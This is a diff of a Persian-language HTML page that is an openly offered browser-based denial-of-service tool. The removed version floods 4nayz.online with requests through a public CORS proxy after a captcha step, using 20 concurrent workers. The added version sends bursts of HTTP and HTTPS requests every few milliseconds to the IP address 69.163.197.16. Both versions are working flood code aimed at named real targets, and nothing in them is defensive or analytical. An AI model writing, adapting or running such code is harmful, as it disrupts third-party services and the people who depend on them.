@@ -1,201 +1,40 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>💀 4nayz Online Attack</title>
-    <style>
-        body {
-            font-family: Tahoma, Arial;
-            background: #0a0a0f;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        .box {
-            background: #111;
-            border: 2px solid #00ff88;
-            border-radius: 15px;
-            padding: 30px;
-            max-width: 600px;
-            margin: 20px auto;
-        }
-        h1 { color: #00ff88; }
-        .btn {
-            padding: 15px 40px;
-            margin: 10px;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .btn-green { background: #00ff88; color: black; }
-        .btn-red { background: #ff4444; color: white; }
-        .btn-blue { background: #0088ff; color: white; }
-        .status {
-            background: #0d0d1a;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 10px 0;
-        }
-        .log {
-            background: #050510;
-            padding: 15px;
-            border-radius: 10px;
-            height: 150px;
-            overflow-y: auto;
-            text-align: left;
-            direction: ltr;
-            font-size: 12px;
-        }
-        .green { color: #00ff88; }
-        .red { color: #ff4444; }
-        .yellow { color: #ffaa00; }
-        a { color: #00ff88; }
-    </style>
-</head>
+<html>
+<head><title>فشار مستقیم به سرور</title></head>
 <body>
-
-<div class="box">
-    <h1>💀 4NAYZ.ONLINE ATTACK</h1>
-    <p style="color: #888; margin-bottom: 20px;">ساده‌ترین راه برای حمله</p>
-
-    <!-- مرحله 1 -->
-    <div style="background: #1a1a2e; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: #ffaa00;">مرحله ۱: حل کپچا</h2>
-        <p style="margin: 15px 0;">
-            روی دکمه زیر کلیک کن تا مرورگر جدید باز بشه
-        </p>
-        <button class="btn btn-blue" onclick="openBrowser()">🌐 باز کردن سایت در مرورگر</button>
-        <p style="color: #888; margin-top: 10px; font-size: 14px;">
-            بعد از حل کپچا، برگرد و دکمه زیر رو بزن
-        </p>
-        <button class="btn btn-green" onclick="captchaSolved()">✅ کپچا حل شد!</button>
-    </div>
-
-    <!-- مرحله 2 -->
-    <div style="background: #1a1a2e; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
-        <h2 style="color: #00ff88;">مرحله ۲: شروع حمله</h2>
-        <div class="status">
-            <div style="display: flex; justify-content: space-around; flex-wrap: wrap;">
-                <div>✅ موفق: <span id="successCount">0</span></div>
-                <div>❌ خطا: <span id="failCount">0</span></div>
-                <div>🚀 نرخ: <span id="rate">0</span>/s</div>
-                <div>⏱ زمان: <span id="time">00:00</span></div>
-            </div>
-        </div>
-        <button class="btn btn-green" id="startBtn" onclick="startAttack()">🚀 شروع حمله</button>
-        <button class="btn btn-red" id="stopBtn" onclick="stopAttack()" disabled>🛑 توقف</button>
-    </div>
-
-    <!-- لاگ -->
-    <div class="log" id="logContainer">
-        <div class="yellow">📌 اول کپچا حل کن</div>
-    </div>
-</div>
-
+<h2>حمله به 69.163.197.16</h2>
+<button onclick="start()">🔥 شروع</button>
+<button onclick="stop()">⛔ توقف</button>
+<p id="s">منتظر...</p>
 <script>
-    let isAttacking = false;
-    let success = 0;
-    let fail = 0;
-    let startTime = null;
-    let captchaReady = false;
+let run = false, c = 0;
 
-    function log(msg, color = 'yellow') {
-        const logDiv = document.getElementById('logContainer');
-        const entry = document.createElement('div');
-        entry.className = color;
-        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logDiv.appendChild(entry);
-        logDiv.scrollTop = logDiv.scrollHeight;
-    }
+function sendReq() {
+    if(!run) return;
+    let x = new XMLHttpRequest();
+    x.open("GET", "http://69.163.197.16/?r=" + Math.random(), true);
+    x.send();
+    let x2 = new XMLHttpRequest();
+    x2.open("GET", "https://69.163.197.16/?r=" + Math.random(), true);
+    x2.send();
+    c += 2;
+    document.getElementById("s").innerHTML = "📨 درخواست: " + c;
+    setTimeout(sendReq, 5);
+}
 
-    function openBrowser() {
-        // باز کردن در تب جدید
-        window.open('https://4nayz.online', '_blank');
-        log('🌐 سایت در تب جدید باز شد. کپچا حل کن', 'yellow');
-    }
+function start() {
+    run = true; c = 0;
+    for(let i=0; i<100; i++) setTimeout(sendReq, i * 10);
+    setInterval(() => {
+        if(run) for(let i=0; i<50; i++) setTimeout(sendReq, i * 5);
+    }, 2000);
+    document.getElementById("s").innerHTML = "🔥 حمله شروع شد به 69.163.197.16";
+}
 
-    function captchaSolved() {
-        captchaReady = true;
-        log('✅ کپچا حل شد! حالا دکمه شروع حمله رو بزن', 'green');
-    }
-
-    async function sendAttack() {
-        try {
-            // استفاده از CORS Proxy
-            const proxyUrl = 'https://api.allorigins.win/raw?url=';
-            const targetUrl = `https://4nayz.online/?t=${Date.now()}`;
-
-            const response = await fetch(proxyUrl + encodeURIComponent(targetUrl), {
-                method: 'GET',
-                mode: 'cors',
-                headers: {
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
-            });
-
-            if (response.ok || response.status === 200) {
-                success++;
-            } else {
-                fail++;
-            }
-        } catch(e) {
-            fail++;
-        }
-    }
-
-    async function worker() {
-        while(isAttacking) {
-            await sendAttack();
-            await new Promise(r => setTimeout(r, 50));
-        }
-    }
-
-    function startAttack() {
-        if(!captchaReady) {
-            log('❌ اول کپچا حل کن!', 'red');
-            return;
-        }
-
-        if(isAttacking) return;
-
-        isAttacking = true;
-        startTime = Date.now();
-
-        document.getElementById('startBtn').disabled = true;
-        document.getElementById('stopBtn').disabled = false;
-
-        log('🚀 حمله شروع شد!', 'green');
-
-        // تایمر
-        setInterval(() => {
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            const mins = Math.floor(elapsed / 60);
-            const secs = elapsed % 60;
-            document.getElementById('time').textContent = 
-                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
-
-            const rate = Math.floor((success + fail) / Math.max(elapsed, 1));
-            document.getElementById('rate').textContent = rate;
-            document.getElementById('successCount').textContent = success;
-            document.getElementById('failCount').textContent = fail;
-        }, 1000);
-
-        // شروع 20 تا کارگر (بیشتر باعث بسته شدن نمیشه)
-        for(let i = 0; i < 20; i++) {
-            worker();
-        }
-
-        log('🔥 20 تا درخواست همزمان شروع شد', 'green');
-    }
-
-    function stopAttack() {
-        isAttacking = false;
-        document.getElementById('startBtn').disabled = false;
-        document.getElementById('stopBtn').disabled = true;
-        log('🛑 حمله متوقف شد', 'red');
-    }
+function stop() {
+    run = false;
+    document.getElementById("s").innerHTML = "⛔ متوقف شد (" + c + " درخواست)";
+}
 </script>
 </body>
 </html>
